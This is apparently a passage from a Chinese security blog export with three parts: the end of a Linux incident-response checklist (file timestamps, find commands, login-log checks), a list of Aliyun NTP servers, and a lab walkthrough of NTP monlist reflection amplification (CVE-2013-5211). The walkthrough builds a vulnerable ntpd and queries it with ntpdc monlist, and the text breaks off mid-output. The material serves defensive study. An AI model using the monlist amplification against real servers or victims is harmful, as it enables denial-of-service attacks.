class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># chmod o+x 11.txt</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-x <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># stat 11.txt</span><br>  <span class="hljs-symbol">File:</span> <span class="hljs-number">11</span>.txt<br>  <span class="hljs-symbol">Size:</span> <span class="hljs-number">2</span>         <span class="hljs-symbol">Blocks:</span> <span class="hljs-number">8</span>          <span class="hljs-title class_">IO</span> <span class="hljs-symbol">Block:</span> <span class="hljs-number">4096</span>   regular file<br><span class="hljs-symbol">Device:</span> fc03h/<span class="hljs-number">64515</span>d<span class="hljs-symbol">Inode:</span> <span class="hljs-number">654221</span>      <span class="hljs-symbol">Links:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">Access:</span> (<span class="hljs-number">0645</span>/-rw-r--r-x)  <span class="hljs-symbol">Uid:</span> (    <span class="hljs-number">0</span>/    root)   <span class="hljs-symbol">Gid:</span> (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-symbol">Access:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">30.511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Modify:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">33.786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Change:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">49.314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-symbol">Birth:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26.983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web访问，会修改access时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0645</span>/-rw-r--r-x)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">46</span>:<span class="hljs-number">17</span>.<span class="hljs-number">408516145</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49</span>.<span class="hljs-number">314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web下载文件到设备，会修改文件的access和change时间，change时间会修改为落盘时间</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs subunit">2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 wget 下载<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# wget http://xx.xx.xx.xx:1234/11.txt<br>-<span class="hljs-string">-2024</span><span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33--  http://xx.xx.xx.xx:1234/11.txt<br>正在连接 xx.xx.xx.xx:1234... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2 [text/plain]<br>正在保存至: “11.txt”<br><br>100%[==============================================================================================================&gt;] 2           --.-K/s 用时 0s<br><br>2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 (279 KB/s) - 已保存 “11.txt” [2/2])<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# stat 11.txt<br>  文件：&quot;11.txt&quot;<br>  大小：2         块：8          IO 块：4096   普通文件<br>设备：fd01h/64769dInode：925677      硬链接：1<br>权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)<br>最近访问：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.000000000 <span class="hljs-string">+0800</span><br>最近更改：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:07:33.000000000 <span class="hljs-string">+0800</span><br>最近改动：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.231719265 <span class="hljs-string">+0800</span><br>创建时间：-<br></code></pre></td></tr></table></figure><h4 id="排查tmp目录"><a href="#排查tmp目录" class="headerlink" title="排查tmp目录"></a>排查tmp目录</h4><p>任意用户可操作的目录，排查是否存在可疑文件</p><p>&#x2F;tmp&#x2F;</p><p>&#x2F;var&#x2F;tmp&#x2F;</p><h4 id="排查近期改动文件"><a href="#排查近期改动文件" class="headerlink" title="排查近期改动文件"></a>排查近期改动文件</h4><h5 id="24小时内被改动文件查找-全局查找"><a href="#24小时内被改动文件查找-全局查找" class="headerlink" title="24小时内被改动文件查找(全局查找)"></a>24小时内被改动文件查找(全局查找)</h5><p>查找24小时内修改过的jsp文件</p><p>find &#x2F; -mtime 0 -name “*.jsp”</p><h5 id="72小时内被新增文件查找-全局查找"><a href="#72小时内被新增文件查找-全局查找" class="headerlink" title="72小时内被新增文件查找(全局查找)"></a>72小时内被新增文件查找(全局查找)</h5><p>查找72小时内新增的文件</p><p>find &#x2F; -ctime 2 -name “*.*“</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-comment"># find / -ctime -2 -name &quot;*.*&quot;</span><br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10143</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10142</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/system/session</span>-<span class="hljs-number">10143</span>.scope.d<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/audit/audit</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220823</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220823</span>.gz<br></code></pre></td></tr></table></figure><h4 id="排查高权限文件"><a href="#排查高权限文件" class="headerlink" title="排查高权限文件"></a>排查高权限文件</h4><h5 id="777权限文件查找"><a href="#777权限文件查找" class="headerlink" title="777权限文件查找"></a>777权限文件查找</h5><p>find &#x2F; -iname “*.jsp” -perm 777</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# find /</span> <span class="hljs-operator">-</span>iname <span class="hljs-string">&quot;*.jsp&quot;</span> <span class="hljs-operator">-</span>perm <span class="hljs-number">777</span><br><span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# ls -lat /</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1</span>.jsp<br><span class="hljs-operator">-</span>rwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">5</span> <span class="hljs-number">8</span>月  <span class="hljs-number">24</span> <span class="hljs-number">21</span>:<span class="hljs-number">09</span> <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br></code></pre></td></tr></table></figure><h3 id="排查相关日志"><a href="#排查相关日志" class="headerlink" title="排查相关日志"></a>排查相关日志</h3><h4 id="历史操作命令history"><a href="#历史操作命令history" class="headerlink" title="历史操作命令history"></a>历史操作命令history</h4><p>读取 ~&#x2F;.bash_history ，默认输出格式为：num command</p><p>默认保存1000条</p><p>.bash_history文件权限600，每个用户独有一份</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># ls -lat ~/.bash_history</span><br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3738 </span>8月  <span class="hljs-number"> 7 </span>19:13 /root/.bash_history<br></code></pre></td></tr></table></figure><p>正常情况下是退出bash后会将历史命令信息保存在.bash_history文件中</p><h4 id="root-bash-history"><a href="#root-bash-history" class="headerlink" title="&#x2F;root&#x2F;.bash_history"></a>&#x2F;root&#x2F;.bash_history</h4><p>root 用户 history -w 写入的 history 记录文件</p><h4 id="var-spool-mail-root"><a href="#var-spool-mail-root" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root"></a>&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</h4><h4 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="&#x2F;var&#x2F;log&#x2F;wtmp"></a>&#x2F;var&#x2F;log&#x2F;wtmp</h4><h4 id="检查系统用户登录日志"><a href="#检查系统用户登录日志" class="headerlink" title="检查系统用户登录日志"></a>检查系统用户登录日志</h4><p>日志路径：&#x2F;var&#x2F;log&#x2F;secure</p><h5 id="检查密码登录成功记录"><a href="#检查密码登录成功记录" class="headerlink" title="检查密码登录成功记录"></a>检查密码登录成功记录</h5><p>查看登录成功记录的来源IP判断入侵来源，可以将来源IP进行威胁情报检测，查看IP状态</p><p>cat secure* | grep “Accepted password”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 <span class="hljs-built_in">log</span>]<span class="hljs-meta"># cat secure* | grep <span class="hljs-string">&quot;Accepted password&quot;</span></span><br>Mar <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">08</span> aliyun<span class="hljs-number">-1</span>_1_1_1 sshd[<span class="hljs-number">14458</span>]: Accepted password <span class="hljs-keyword">for</span> root from <span class="hljs-number">8.3</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> port <span class="hljs-number">16045</span> ssh2<br></code></pre></td></tr></table></figure><h3 id="命令替换工具busybox"><a href="#命令替换工具busybox" class="headerlink" title="命令替换工具busybox"></a>命令替换工具busybox</h3><p><a href="https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox">https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>secresponse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>secresponse</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntp_domain</title>
    <link href="/2024/03/08/yunwei/applications/ntp/ntp_domain/"/>
    <url>/2024/03/08/yunwei/applications/ntp/ntp_domain/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="常见ntp服务域名"><a href="#常见ntp服务域名" class="headerlink" title="常见ntp服务域名"></a>常见ntp服务域名</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><table><thead><tr><th align="left">经典网络内网</th><th align="left">专有网络VPC内网</th><th align="left">公网</th></tr></thead><tbody><tr><td align="left">-</td><td align="left">ntp.cloud.aliyuncs.com</td><td align="left">ntp.aliyun.com</td></tr><tr><td align="left">ntp1.cloud.aliyuncs.com</td><td align="left">ntp7.cloud.aliyuncs.com</td><td align="left">ntp1.aliyun.com</td></tr><tr><td align="left">ntp2.cloud.aliyuncs.com</td><td align="left">ntp8.cloud.aliyuncs.com</td><td align="left">ntp2.aliyun.com</td></tr><tr><td align="left">ntp3.cloud.aliyuncs.com</td><td align="left">ntp9.cloud.aliyuncs.com</td><td align="left">ntp3.aliyun.com</td></tr><tr><td align="left">ntp4.cloud.aliyuncs.com</td><td align="left">ntp10.cloud.aliyuncs.com</td><td align="left">ntp4.aliyun.com</td></tr><tr><td align="left">ntp5.cloud.aliyuncs.com</td><td align="left">ntp11.cloud.aliyuncs.com</td><td align="left">ntp5.aliyun.com</td></tr><tr><td align="left">ntp6.cloud.aliyuncs.com</td><td align="left">ntp12.cloud.aliyuncs.com</td><td align="left">ntp6.aliyun.com</td></tr><tr><td align="left">-</td><td align="left">-</td><td align="left">ntp7.aliyun.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>ntp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ntp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>udp_flood</title>
    <link href="/2024/03/08/security/netSec/ddos/udp_flood/"/>
    <url>/2024/03/08/security/netSec/ddos/udp_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在DDoS攻击中，攻击方式以协议进行划分的话，主要是TCP Flood，UDP Flood，ICMP Flood 等，其中 UDP Flood是最主要也是最常见的流量型攻击方式。</p><p>2021年5月，QUIC正式成为互联网标准协议，针对80、443端口的UDP Flood徒增。</p><h1 id="ntp反射"><a href="#ntp反射" class="headerlink" title="ntp反射"></a>ntp反射</h1><h2 id="放大倍数"><a href="#放大倍数" class="headerlink" title="放大倍数"></a>放大倍数</h2><p>556.9</p><h2 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h2><p>协议：UDP</p><p>端口：123</p><h2 id="ntp反射原理"><a href="#ntp反射原理" class="headerlink" title="ntp反射原理"></a>ntp反射原理</h2><h3 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h3><p>ntp(Network Time Protocol)网络时间协议，采用服务器-客户端模型，提供高精度的时间矫正机制，客户端会定时从服务器同步自身时间。</p><p>存在监控(monlist)功能，用于监控NTP服务器。NTP服务器会记录与服务器进行过时间同步的客户端IP，客户端可通过命令获取记录的IP。</p><p>每个NTP服务器可以记录进行过时间同步的最后600个客户端的IP，客户端获取记录的时候，服务器会返回记录的600个客户端IP地址，响应包按照6个IP地址进行分割，最多可以返回100个响应包。</p><h3 id="涉及漏洞-反射放大攻击-CVE-2013-5211"><a href="#涉及漏洞-反射放大攻击-CVE-2013-5211" class="headerlink" title="涉及漏洞-反射放大攻击(CVE-2013-5211)"></a>涉及漏洞-反射放大攻击(CVE-2013-5211)</h3><h4 id="反射含义"><a href="#反射含义" class="headerlink" title="反射含义"></a>反射含义</h4><p>UDP协议是无状态的，不会进行校验请求来源。客户端请求，服务端响应，就是一次交互。正是由于无状态的特点，导致部分低版本的ntp服务器没有针对请求地址的校验机制，可以进行请求地址伪造，将响应内容返回给伪造的请求地址，从而造成对伪造请求地址的攻击。</p><h4 id="放大含义"><a href="#放大含义" class="headerlink" title="放大含义"></a>放大含义</h4><p>由于NTP协议的monlist功能，攻击者利用僵尸主机，同时向NTP服务器发起大量monlist请求，1个monlist请求可造成100个响应数据包。</p><p>通常情况下，每个ntp请求包的大小约为90字节，正常响应包大小也应该为90字节左右，monlist的响应包大小约为482字节，100个响应数据包是48200字节，相比正常响应包放大了500倍。</p><p><img src="/2024/03/08/security/netSec/ddos/udp_flood/image-20240312155532466.png" alt="image-20240312155532466"></p><p><img src="/2024/03/08/security/netSec/ddos/udp_flood/image-20240312160850672.png" alt="image-20240312160850672"></p><h2 id="ntp相关命令"><a href="#ntp相关命令" class="headerlink" title="ntp相关命令"></a>ntp相关命令</h2><h3 id="ntpdc命令"><a href="#ntpdc命令" class="headerlink" title="ntpdc命令"></a>ntpdc命令</h3><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><h3 id="ntp服务器端搭建10-185-16-237"><a href="#ntp服务器端搭建10-185-16-237" class="headerlink" title="ntp服务器端搭建10.185.16.237"></a>ntp服务器端搭建10.185.16.237</h3><h4 id="下载源码包"><a href="#下载源码包" class="headerlink" title="下载源码包"></a>下载源码包</h4><p><a href="https://www.eecis.udel.edu/~ntp/ntp_spool/">https://www.eecis.udel.edu/~ntp/ntp_spool/</a></p><p><a href="https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.2.tar.gz">https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.2.tar.gz</a></p><h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><p>1、.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ntp –enable-all-clocks –enable-parse-clocks<br>2、make &amp;&amp; make install</p><p>3、sudo cp &#x2F;opt&#x2F;ntp&#x2F;ntp-4.2.2&#x2F;ntpd&#x2F;ntpd &#x2F;etc&#x2F;init.d&#x2F;ntpd</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@nvm</span><span class="hljs-operator">-</span>9fsth8htsn60 ntp<span class="hljs-operator">-</span><span class="hljs-number">4.2</span>.<span class="hljs-number">2</span>]# ll <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>ntpd<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root <span class="hljs-number">1600776</span> <span class="hljs-type">May</span> <span class="hljs-number">17</span> <span class="hljs-number">10</span>:<span class="hljs-number">27</span> <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>ntpd<br></code></pre></td></tr></table></figure><p>4、&#x2F;etc&#x2F;init.d&#x2F;ntpd</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@nvm-<span class="hljs-number">9</span>fsth8htsn60 /]# ps -ef | grep ntpd<br>root     <span class="hljs-number">1058929</span>       <span class="hljs-number">1</span>  <span class="hljs-number">0</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> /etc/init.d/ntpd<br>root     <span class="hljs-number">1058931</span> <span class="hljs-number">1043070</span>  <span class="hljs-number">0</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> grep --color=auto ntpd<br>[root@nvm-<span class="hljs-number">9</span>fsth8htsn60 /]# netstat -anlp | grep ntpd<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0 10.185.16</span>.<span class="hljs-number">237:123</span>       <span class="hljs-number">0.0.0.0</span>:*                           <span class="hljs-number">1058929</span>/ntpd<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0 127.0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">123</span>           <span class="hljs-number">0.0.0.0</span>:*                           <span class="hljs-number">1058929</span>/ntpd<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">123</span>             <span class="hljs-number">0.0.0.0</span>:*                           <span class="hljs-number">1058929</span>/ntpd<br></code></pre></td></tr></table></figure><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>默认配置文件 &#x2F;etc&#x2F;ntp.conf，如没有，可以新建文件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@nvm-9fsth8htsn60 /]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> /etc/ntp.<span class="hljs-keyword">conf</span><br><span class="hljs-keyword">ls</span>: cannot access &#x27;/etc/ntp.<span class="hljs-keyword">conf</span>&#x27;: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory<br>[root@nvm-9fsth8htsn60 /]# touch /etc/ntp.<span class="hljs-keyword">conf</span><br>[root@nvm-9fsth8htsn60 /]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /etc/ntp.<span class="hljs-keyword">conf</span><br>-rw-r--r-- 1 root root 0 May 17 10:30 /etc/ntp.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h5 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h5><p>#权限设置，限制访问时间服务器的来源</p><p>#拒绝来自IPv4的访问</p><p>restrict default kod nomodify notrap nopeer noquery </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[root@nvm-14yhwwkhnu5v0 ntpdc]</span># ./ntpdc -n -c monlist <span class="hljs-number">10</span>.<span class="hljs-number">185</span>.<span class="hljs-number">16</span>.<span class="hljs-number">237</span><br><span class="hljs-number">10.185.16.237</span>: timed out, nothing received<br>***Request timed out<br><br><br></code></pre></td></tr></table></figure><p>#拒绝来自IPv6的访问</p><p>restrict -6 default kod nomodify notrap nopeer noquery </p><p>#允许本机访问</p><p>restrict 127.0.0.1</p><p>restrict -6 ::1 </p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>server cn.ntp.org.cn  #设置时间同步服务器</p><p>#表示server不可用时使用本地时间为客户端进行校准</p><p>server 127.127.1.0<br>fudge 127.127.1.0 stratum 8</p><p>#允许10.210.128.0&#x2F;24客户端进行时间同步</p><p>restrict 10.210.128.0 mask 255.255.255.0 nomodify</p><p>#允许任何IP的客户机都可以进行时间同步</p><p>restrict default nomodify</p><h3 id="ntp客户端搭建10-2-2-63"><a href="#ntp客户端搭建10-2-2-63" class="headerlink" title="ntp客户端搭建10.2.2.63"></a>ntp客户端搭建10.2.2.63</h3><p>默认情况下，服务器不存在ntpdc等ntp相关命令，需要安装</p><h4 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4><h5 id="下载源码包-1"><a href="#下载源码包-1" class="headerlink" title="下载源码包"></a>下载源码包</h5><p><a href="https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.2.tar.gz">https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.2.tar.gz</a></p><h5 id="编译安装-1"><a href="#编译安装-1" class="headerlink" title="编译安装"></a>编译安装</h5><p>1、tar -zxvf ntp-4.2.2.tar.gz</p><p>2、.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;ntp –enable-all-clocks –enable-parse-clocks<br>3、make &amp;&amp; make install</p><p>4、sudo cp &#x2F;opt&#x2F;ntp&#x2F;ntp-4.2.2&#x2F;ntpd&#x2F;ntpd &#x2F;etc&#x2F;init.d&#x2F;ntpd</p><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><p>&#x2F;etc&#x2F;init.d&#x2F;ntpd</p><h5 id="测试是否支持monlist"><a href="#测试是否支持monlist" class="headerlink" title="测试是否支持monlist"></a>测试是否支持monlist</h5><p>进入 ntpdc ，执行 monlist 命令</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ntp-4.2.2]<span class="hljs-comment"># ./ntpdc/ntpdc</span><br>ntpdc&gt; monlist<br>remote address          port local address      count m ver code avgint  lstint<br>===============================================================================<br>localhost             <span class="hljs-number"> 54263 </span>127.0.0.1             <span class="hljs-number"> 1 </span>7<span class="hljs-number"> 2 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      0<br>100.100.5.2             <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 5 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      0<br>100.100.3.3             <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 8 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      0<br>203.107.6.88            <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 7 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      1<br>100.100.3.2             <span class="hljs-number"> 123 </span>172.16.24.136        <span class="hljs-number"> 10 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 1 </span>      1<br>100.100.5.1             <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 6 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      1<br>100.100.5.3             <span class="hljs-number"> 123 </span>172.16.24.136         <span class="hljs-number"> 5 </span>4<span class="hljs-number"> 4 </span>   1d0     <span class="hljs-number"> 2 </span>      1<br>100.100.3.1             <span class="hljs-number"> 123 </span>172.16.24.136        <span class="hljs-number"> 10 </span>4<span class="hljs-number"> 4 